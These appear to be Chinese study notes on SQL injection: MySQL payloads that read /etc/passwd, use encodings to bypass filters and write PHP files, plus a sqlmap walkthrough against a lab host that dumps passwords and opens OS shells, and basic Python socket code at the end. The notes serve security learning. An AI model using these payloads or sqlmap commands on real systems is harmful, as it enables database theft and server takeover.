

# Web安全深度剖析

## 第五章 SQL注入漏洞

### 5.1 SQL注入原理

造成SQL注入漏洞的主要原因还是因为后端没有对用户的输入做任何或者说有效的过滤，导致拼接出了一条非预期的SQL语句并成功执行

### 5.2 注入漏洞分类

常见的SQL注入类型包括：数字型和字符型。也有人吧类型分的更多、更细。但不管注入类型如何，攻击者的目的只有一点，那就是绕过程序限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限

#### 5.2.1 数字型注入

数字型注入的最简单的一种型如下：`http://www.baidu.com?id=8`

要确定目标是否是数字型的注入，可以直接输入payload：`-1`拼接为`http://www.baidu.com?id=8-1`，此时如果页面发生了变化，则证明SQL端确实对`8-1`做了运算，以此便可确定是数字型注入

#### 5.2.2 字符型注入

当输入参数为字符串时，称为字符型；数字型和字符型最大的区别在于：数字型不需要单引号闭合，而字符串类型一般需要使用单引号来闭合

字符型例句：`select * from users where username='admin'`

最常见的注入方法是用`'`闭合前面的单引号并注释掉后面的单引号，中间则为可控部分，形如：`' or 1=1#`

### 5.3 常见的数据库注入

滴哦大数数据库而言，SQL注入的原理基本相似，因为每个数据库斗遵循一个SQL语法标准。但他们之间也存在许多细微的差异，包括语法、函数的不同。所以，在针对不同的数据库注入时，思路、方法也不可能完全一样

攻击者对数据库注入，无非是利用数据库获取更多的数据或者更大的权限，那么利用方式可以归为以下几大类：

+ 查询数据
+ 读写文件
+ 执行命令

#### 5.3.1 SQL Server

由于Docker Hub上没有找到现成环境且SQL Server就没遇到过，这里就偷懒了。需要的时候可以回去查......

#### 5.3.2 MySQL

##### 1. MySQL中的注释

MySQL支持以下3种注释风格

+ `#`：注释从`#`字符到行尾
+ `--`：注释从`--`序列到行尾。需要注意的是，使用此注释时，**后面需要跟上一个或多个空格**；注：空格、tag都可以
+ `/**/`：注释从`/*序列到后面*/`序列中间的字符

其中，`/**/`注释存在一个特点，观察以下SQL语句：

```sql
mysql> select username/*!50000,password*/ from users;
+----------+------------+
| username | password   |
+----------+------------+
| Dumb     | Dumb       |
| Angelina | I-kill-you |
| Dummy    | p@ssword   |
| secure   | crappy     |
| stupid   | stupidity  |
| superman | genious    |
| batman   | mob!le     |
| admin    | admin      |
+----------+------------+
```

这时因为`/*!*/`感叹号是有特殊意义的，比如`/*!50000,password*/`的意思是；若Mysql版本号高于或等于`5.0.00`，语句将会被执行

##### 2. 获取元数据

Mysql 5.0 及其以上版本提供了`information_schema.schema`，`information_schema.schema`是信息数据库，它提供了访问数据库元数据的方式

**1. 查询用户数据库名称**

```sql
mysql> select schema_name from information_schema.schemata;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| challenges         |
| ctfsu              |
| ewshop             |
| ggbond             |
| intruder           |
| lmonkey            |
| mysql              |
| nodejs             |
| performance_schema |
| pyspider           |
| pyuser             |
| security           |
| sys                |
| tp_access          |
+--------------------+
15 rows in set (0.00 sec)
```

**2. 查询当前数据库表**

```sql
mysql> select table_name from information_schema.tables where table_schema=database();
+------------+
| table_name |
+------------+
| emails     |
| gg_flag    |
| gg_users   |
| referers   |
| uagents    |
| users      |
+------------+
6 rows in set (0.00 sec)
```

**3. 查询指定表的所有字段**

```sql
mysql> select column_name from information_schema.columns where table_schema=database() and table_name='users';
+-------------+
| column_name |
+-------------+
| id          |
| username    |
| password    |
+-------------+
3 rows in set (0.02 sec)
```

##### 3. UNION 查询

MySQL官方解释UNION查询用于把来自许多SELECT语句的结果组合到一个结果集合种，且每列的数据类型必须相同

```sql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3;
```

##### 4. MySQL 函数利用

**（1）`load_file()`函数读文件操作**

MySQL提供了`load_file()`函数，可以帮助用户快速读取文件，但文件的位置必须在服务器上，文件必须为全路径名称**（绝对路径）**，而且用户必须持有FILE权限，文件容量也必须小于`max_allowed_packet`字节（默认为16MB，最大为1GB）

**MySQL的`secure_file_priv`必须为空，允许MySQL对文件进行读写操作**

```sql
# 查看是否允许读取文件
mysql> show variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.06 sec)

# 查看可读文件的最大
mysql> show variables like 'max_allowed_packet%';
+--------------------+----------+
| Variable_name      | Value    |
+--------------------+----------+
| max_allowed_packet | 16777216 |
+--------------------+----------+
1 row in set (0.01 sec)
```

SQL 语句如下：

```sql
mysql> select load_file('/etc/passwd');
```

通常。一些防注入语句不允许单引号的出现，那么使用以下语句绕过：

```sql
select load_file(0x2f6574632f706173737764);
```

或者使用：

```sql
select load_file(char(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100));
```

`char()`的作用是将ASCII码转换为字符串

在浏览器返回数据时，有可能存在乱码问题，那么可以使用`hex()`函数将字符串转换为十六进制数据；经过测试发现MySQL在文件读取上默认返回的就是十六进制

```mysql
select hex(load_file(char(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)));
```

**（2）into outfile 写文件操作**

MySQL提供了向磁盘写入文件的操作，与`load_file()`一样，必须持有FILE权限`（secure_file_priv=''）`，并且文件必须为绝对路径

在写入时必须考虑MySQL是否有足够的权限往当前路径写文件

```mysql
select '<?php phpinfo();?>' into outfile '/tmp/1.php';
```

**（3）连结字符串**

在MySQL查询中，如果需要一次查询多个数据，可以使用`concat()`或`concat_ws()`函数来完成

1. `concat()`函数

   ```sql
   mysql> select concat(user(),',',version());
   +------------------------------+
   | concat(user(),',',version()) |
   +------------------------------+
   | root@localhost,8.0.33        |
   +------------------------------+
   1 row in set (0.00 sec)
   ```

   可以发现，现在三个值已经成为一列，并且以逗号隔开。在`concat()`函数中，逗号也可以使用十六进制数来表示

   ```sql
   mysql> select concat(user(),0x2c,version());
   +-------------------------------+
   | concat(user(),0x2c,version()) |
   +-------------------------------+
   | root@localhost,8.0.33         |
   +-------------------------------+
   1 row in set (0.00 sec)
   ```

2. `concat_ws()`函数

   ```
   concat_ws('分隔符', 参数1, 参数2)
   ```

   `concat_ws()`函数比`concat()`函数在使用上更简洁，且可以代替`concat()`函数

   ```sql
   mysql> select concat_ws(0x2c,user(),version());
   +----------------------------------+
   | concat_ws(0x2c,user(),version()) |
   +----------------------------------+
   | root@localhost,8.0.33            |
   +----------------------------------+
   1 row in set (0.00 sec)
   ```

<center><strong>常用MySQL函数及说明</strong></center>

| 函数                 | 说明                                           |
| -------------------- | ---------------------------------------------- |
| length               | 返回字符串长度                                 |
| substring            | 截取字符串长度                                 |
| ascii                | 返回ASCII码                                    |
| hex                  | 把字符串转换为十六进制                         |
| now                  | 当前系统时间                                   |
| unhex                | hex的方向操作                                  |
| floor(x)             | 返回不大于x的最大整数值                        |
| md5                  | 返回MD5值                                      |
| group_concat         | 返回带有来自一个组的连接的非NULL值的字符串结果 |
| @@datadir            | 读取数据库路径                                 |
| @@basedir            | MySQL安装路径                                  |
| @@version_complie_os | 操作系统                                       |
| user                 | 用户名                                         |
| current_user         | 当前用户名                                     |
| system_ueer          | 系统用户名                                     |
| database             | 数据库名                                       |
| version              | MySQL数据库版本                                |

<center><strong>MySQL 函数的权限</strong></center>

| 权限                    | 权限级别               | 权限说明                                                 |
| ----------------------- | ---------------------- | -------------------------------------------------------- |
| CREATE                  | 数据库、表或索引       | 创建数据库、表或索引权限                                 |
| DROP                    | 数据库或表             | 删除数据库或表权限                                       |
| GRANT OPTION            | 数据库、表或保存的程序 | 赋予权限选项                                             |
| ALTER                   | 表                     | 更改表，比如添加字段                                     |
| DELETE                  | 表                     | 删除数据权限                                             |
| INDEX                   | 表                     | 索引权限                                                 |
| INSERT                  | 表                     | 插入数据权限                                             |
| SELETE                  | 表                     | 查询权限                                                 |
| UPDATE                  | 表                     | 更新权限                                                 |
| CREATE VIEW             | 视图                   | 创建视图权限                                             |
| SHOW VIEW               | 视图                   | 查看视图权限                                             |
| ALTER ROUTING           | 存储过程               | 更改存储过程权限                                         |
| CREATE ROUTING          | 存储过程               | 创建存储过程权限                                         |
| EXECUTE                 | 存储过程               | 执行存储过程权限                                         |
| FILE                    | 服务器主机上的文件权限 | 文件访问权限                                             |
| CREATE TEMPORARY TABLES | 服务器管理             | 创建临时表权限                                           |
| LOCK TABLES             | 服务器管理             | 锁表权限                                                 |
| CREATE USER             | 服务器管理             | 创建用户权限                                             |
| PROCESS                 | 服务器管理             | 查看进程权限                                             |
| PELOAD                  | 服务器管理             | 执行 flush-hosts、flush-logs、flush-privileges等命令权限 |
| PEPLICATION CLIENT      | 服务器管理             | 复制权限                                                 |
| PREPLICATION SLAVE      | 服务器管理             | 复制权限                                                 |
| SHOW DATABASES          | 服务器管理             | 查看数据库权限                                           |
| SHUTDOWN                | 服务器管理             | 关闭数据库权限                                           |
| SUPER                   | 服务器管理             | 执行kill线程权限                                         |

##### 5. MySQL 显错式注入

这里直接给出`insert`和`update`语句的用法

```sql
mysql> update users set password='admin' where username='sugar' or updatexml(1,concat(0x7e, (select version())),3);
ERROR 1105 (HY000): XPATH syntax error: '~5.7.26'

mysql> insert into users (username,password) values ('jack', 'jack' and extractvalue(0x7e, concat(0x7e, (select database()))));
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

##### 6. 宽字节注入

==首先要保证目标的数据库使用的是GBK编码==

将payload改为：`1%df' and 1=1#`，

```php
<?php
$id = "1%df' and 1=1#";
$id = addslashes($id);
$sql = "select * from users where id = '{$id}'";
var_dump($sql);

# 输出：
string(48) "select * from users where id = '1%df\' and 1=1#'"
```

此时，由于GBK的编码方式，会将`%df\`组成一个新字符，这个字符是一个汉字，导致`\`失效，`'`恢复功能：`1ߜ' and 1=1#`

##### 7. MySQL 长字符截断

在MySQL中的一个设置里有一个`sql_mode`选项，当`sql_mode`设置为`default`时，即没有开启`STRICT_ALL_TABLES`选项时（Mysql `sql_mode`默认即`default`），MySQL对插入超长的值只会提示warning，而不是error，这样就可能会导致一些截断问题

新建一张测试表，表结构如下（5.7.26）

```sql
create table test(
id int(11) NOT NULL,
username varchar(7) NOT NULL,
password varchar(12) NOT NULL
);
```

分别插入以下数据

1. 插入正常SQL语句

   ```sql
   insert into test (id,username,password) values (1,'admin','admin');
   ```

2. 插入错误的SQL语句，此时的admin   右面有三个空格，长度为8，已经超过了原有的规定长度

   ```sql
   insert into test (id,username,password) values (2,'admin   ','admin');
   ```

   虽然发生了警告，但是第二条数据依然被成功插入到数据表中

   ```sql
   mysql> select * from test;
   +----+----------+----------+
   | id | username | password |
   +----+----------+----------+
   |  1 | admin    | admin    |
   |  2 | admin    | admin    |
   +----+----------+----------+
   2 rows in set (0.00 sec)
   ```

   使用`length()`函数来获取长度的变化

   ```sql
   mysql> select length(username) from test where id=1;
   +------------------+
   | length(username) |
   +------------------+
   |                5 |
   +------------------+
   1 row in set (0.01 sec)
   
   # 由于字段长度为7，所以哪怕输入长度为8也会被截取为长度7
   mysql> select length(username) from test where id=2;
   +------------------+
   | length(username) |
   +------------------+
   |                7 |
   +------------------+
   1 row in set (0.00 sec)
   ```

   可以发现，第二条与第三条数据的长度为7，也就是列的规定长度，由此可知，在默认情况下。如果数据超出列默认长度，MySQL会将其截断。

   但这样何来攻击一说呢？下面查询用户名为`admin`的用户就知道了

   ```sql
   mysql> select * from test where username='admin';
   +----+----------+----------+
   | id | username | password |
   +----+----------+----------+
   |  1 | admin    | admin    |
   |  2 | admin    | admin    |
   +----+----------+----------+
   2 rows in set (0.00 sec)
   ```

   只查询用户名为`admin`用户，但是另外两个长度不一致的admin用户也被查询出，这样就会导致一些安全问题，必须，有一处管理员登录的SQL如下

   ```php
   SELECT count(*) FROM users where username='admin' and password='$_POST["password"]'
   ```

   假设这条SQL语句没有任何注入漏洞，攻击者也可能登录到管理页面。

   假设管理员登录的用户名为`admin`，那么攻击者仅需要注册一个“admin   ”用户即可轻易进入后台管理页面！！！

##### 8. 延时注入

如果目标站点没有任何的回显，此时可以尝试延时注入

思路：

1. 尝试拼接SQL语句并使用`sleep(3)`函数来判断目标站点是否发生延迟
2. 获取目标数据并截取出字符串的第一个字符，并转换为ASCII码
3. 将第一个字符的ASCII与ASCII码表对比，如果对比成功将延时3秒
4. 继续步骤2、3，之子字符串截取完毕

具体步骤翻阅葵花宝典

### 5.4 SQL 注入工具

#### 5.4.1 SQLMap

SQLMap特点如下：

+ 数据库支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM、DB2、SQLite、Firebird、Sybase和SAP MaxDB
+ SQL注入类型包括SQL盲注、UNION注入、报错注入、时间盲注、布尔盲注和堆叠注入等技术
+ 支持枚举用户、密码哈希、权限、角色、数据库、表和列
+ 支持任意命令
+ 自动识别密码加密方式，并且可以使用字典解密
+ 支持数据导出功能

##### 1. 使用SQLMap

###### 第一步：判断是否有注入点

使用-u参数指定URL，如果URL存在注入点，将会显示出Web容器、数据库版本信息

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" 
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1035=1035

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 OR (SELECT 3063 FROM(SELECT COUNT(*),CONCAT(0x717a767171,(SELECT (ELT(3063=3063,1))),0x717a717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3709 FROM (SELECT(SLEEP(5)))CbSF)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: id=-5045 UNION ALL SELECT CONCAT(0x717a767171,0x627148795652506e496a6b58564c53496679515a68456958646851494b746147465248426c476958,0x717a717171)-- -
---
```

###### 第二步：获取数据库

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --dbs
available databases [15]:
[*] challenges
[*] ctfsu
[*] ewshop
[*] ggbond
[*] information_schema
[*] intruder
[*] lmonkey
[*] mysql
[*] nodejs
[*] performance_schema
[*] pyspider
[*] pyuser
[*] security
[*] sys
[*] tp_access
```

###### 第三步：查看当前应用程序所用数据库

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --current-db
[09:17:43] [INFO] fetching current database
current database: 'security'
```

###### 第四步：列出指定数据库的所有表

使用`--table`参数获取数据库表，-D参数指定数据库

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --tables -D 'security'
[09:18:39] [INFO] fetching tables for database: 'security'
Database: security
[7 tables]
+----------+
| emails   |
| gg_flag  |
| gg_users |
| referers |
| test     |
| uagents  |
| users    |
+----------+
```

###### 第五步：读取指定表中的字段名称

使用`--columns`参数列出字段名

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --columns -D 'security' -T 'users'
[09:19:59] [INFO] fetching columns for table 'users' in database 'security'
Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

###### 第六步：读取指定字段内容

`--dump`参数转存数据、`-C`参数指定字段名称

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" -C 'username,password' -D 'security' -T 'users' --dump
[09:21:23] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'security'
Database: security
Table: users
[19 entries]
+----------+------------+
| username | password   |
+----------+------------+
| Dumb     | Dumb       |
| Angelina | I-kill-you |
| Dummy    | p@ssword   |
| secure   | crappy     |
| stupid   | stupidity  |
| superman | genious    |
| batman   | mob!le     |
| admin    | admin      |
| admin1   | admin1     |
| admin2   | admin2     |
| admin3   | admin3     |
| dhakkan  | dumbo      |
| admin4   | admin4     |
| Spider   | Aa123456   |
| Spider   | Aa123456   |
| Spider   | Aa123456   |
| Spider   | Aa123456   |
| jack     | jack       |
| sugar    | admin      |
+----------+------------+
```

##### 2. SQLMap参数

###### （1）测试注入点权限

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --privileges 
[09:24:55] [INFO] fetching database users privileges
database management system users privileges:
[*] 'mysql.session'@'localhost' (administrator) [1]:
    privilege: SUPER
[*] 'mysql.sys'@'localhost' [1]:
    privilege: USAGE
[*] 'root'@'localhost' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE


┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --privileges -U sa			// 测试sa用户权限
```

###### （2）执行shell命令

```bash
# 执行 net user 命令
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --os-cmd="net user"

# 系统交互的shell
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --os-shell
```

###### （3）获取当前数据库名称

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --current-db
```

###### （4）执行SQL命令

返回SQL交互的shell，可以执行SQL语句

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --sql-shell

┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --sql-query='sql'
```

###### （5）POST提交方式

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --data "POST 参数"
```

###### （6）显示详细的等级

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.1/test2.php?id=1" --dbs -v 1
```

`-v`参数包含以下7个等级

+ 0：只显示Python的回朔、错误和关键信息
+ 1：显示信息和警告信息
+ 2：显示调试信息
+ 3：有效载荷注入
+ 4：显示HTTP请求
+ 5：显示HTTP响应头
+ 6：显示HTTP响应页面内容

###### （7）注入HTTP请求

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -r head.txt --dbs

# head.txt 内容如下
POST /lolgin.php HTTP/1.1
HOST: www.secbug.com
User-Agent: Mozilla/5,0

username=admin&password=admin
```

<center><strong>常用 SQLMap参数及说明</strong></center>

| 参数               | 说明                                             |
| ------------------ | ------------------------------------------------ |
| -b                 | 获取banner                                       |
| -p                 | 指定测试参数                                     |
| -g                 | 从Goole中获取URL，-g "inurl:aspx?id="            |
| --pgage=GOOGLEPAGE | 指定Google页码                                   |
| --union-check      | 是否支持union注入                                |
| --union-cols       | union 查询表记录                                 |
| --union-test       | union 语句测试                                   |
| --union-use        | 采用 union 注入                                  |
| --proxy            | 代理注入                                         |
| --threads          | 采用多线程                                       |
| --user-agent       | 自定义 user-agent                                |
| --refer=REFERER    | HTTP referer 头                                  |
| --string           | 指定关键词                                       |
| --tor              | 创建tor的匿名网络                                |
| --predict-output   | 常见的查询输出预测                               |
| --keep-alive       | 使用持久 HTTP (S) 连接                           |
| --eval=EVALCODE    | 使用 HTTP 参数污染                               |
| -a, all            | 查询所有                                         |
| --hostname         | 主机名                                           |
| --is-dba           | 是否时管理员权限                                 |
| --users            | 枚举所有用户                                     |
| --passwords        | 枚举所有的用户密码                               |
| --roles            | 枚举所有的用户角色                               |
| --schema           | 枚举DBMS模式                                     |
| --count            | 枚举所有的条目数                                 |
| --dump             | 转存DBMS数据库表项目，需要指定字段名称（列名称） |
| --dump-all         | 所属列、表或数据库名称                           |
| --search           | 搜索列、表或数据库名称                           |
| --exclude-sysdbs   | 在枚举表时排除系统数据库                         |
| --sql-query=query  | 执行SQL语句                                      |
| --file-read=RFILE  | 读取操作                                         |
| --file-write=WFILE | 写入操作                                         |
| --file-dest=DFILE  | 绝对路径写入                                     |
| --reg-read         | 读取一个Windows注册表项值                        |
| --reg-add          | 增加一个Windows注册表项值数据                    |
| --reg-del          | 删除一个Windows注册表项值数据                    |
| --reg-key=REGKEY   | Windows 注册表键                                 |
| --reg-value=REGKEY | Windows 注册表键值                               |
| --reg-data=REGDATA | Windows 注册表的键值项数据                       |
| --reg-type=REGDATA | Windows 注册表键的值类型                         |
| --dump-format=DUMP | 转存数据格式（CSV（default）、HTML 或 SQLITE）   |
| --hex              | 使用十六进制检索数据                             |
| --output-dir=ODIR  | 自定义输出的目录路径                             |
| --update           | 更新 SQLMap                                      |
| --purge-output     | 安全删除所有内容的输出目录                       |
| --check-waf        | 启发式检查 WAF/IPS/IDS 保护                      |
| --os-pwn           | 反弹SHELL                                        |
| --cookie=COOKIE    | 指定HTTP Cookie，预登录                          |
| --random=TAMPER    | 使用SQLMap插件                                   |
| --tamper=TAMPER    | 使用SQLMap插件                                   |
| --level            | 测试等级（1~5），默认为1                         |



# Python 黑帽子-黑客与渗透测试编程之道

## 1. 基础的网络编程工具

### 1.1 TCP 客户端

```py
import socket

target_host = 'www.httpbin.org'
target_port = 80

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_port))
# 由于本身是TCP协议，且发送的数据是标准的HTTP协议数据，所以会以HTTP协议来打包发送出去
client.send(b'GET /get HTTP/1.1\r\nHost: baidu.com\r\n\r\n')
response = client.recv(4096)
print(response.decode())
client.close()
```

+ `socket.AF_INET`：表示我们将使用标准的IPv4地址或主机名
+ `socket.SOCK_STREAM`：表示这是一个TCP客户端

HTTP GET 请求必须包含以下字段，每个字段以一个回车分割，结尾以两个回车结束：

```
GET /get HTTP/1.1
Host: baidu.com


```

### 1.2 UDP 客户端

```py
import socket

target_host = 'www.httpbin.org'
target_port = 80

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.connect((target_host, target_port))
client.sendto(b'AAABBBCC', (target_host, target_port))
response = client.recvfrom(4096)

client.close()
```

+ `socket.SOCK_DGRAM`：表示这是一个UDP客户端
+ `recvfrom` ：会返回 消息字符串 还有` (IP address, Port)`

### 1.3 TCP 服务器

```py
import socket
import threading

IP = '0.0.0.0'
PORT = 9998


def main():
    # 创建 Server; socket.AF_INET: 使用AF_INET协议簇，形如：(host, port); socket.SOCK_STREAM: TCP协议
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    # 最多允许5个客户端
    server.listen(5)
    print(f"[*] Listening or {IP}:{PORT}")

    while True:
        # 将接受到的客户端socket对象保存到client变量中，将远程链接的详细信息保存到address变量中
        client, address = server.accept()
        # print(address)        ('127.0.0.1', 55627)
        # print(client)         返回 socket 对象
        print(f"[*] Accepted connection from {address[0]}:{address[1]}")
        # 创建线程
        client_handler = threading.Thread(target=handler_client, args=(client,))
        client_handler.start()


def handler_client(client_socket):
    # 使用上下文管理器，由于这里本身传入的就是Socket对象，所以其实就省略了一句 sock.close()
    with client_socket as sock:
        request = sock.recv(1024)
        print(f"[*] Received: {request.decode('utf-8')}")
        sock.send(b'ACK')


if __name__ == '__main__':
    main()

```

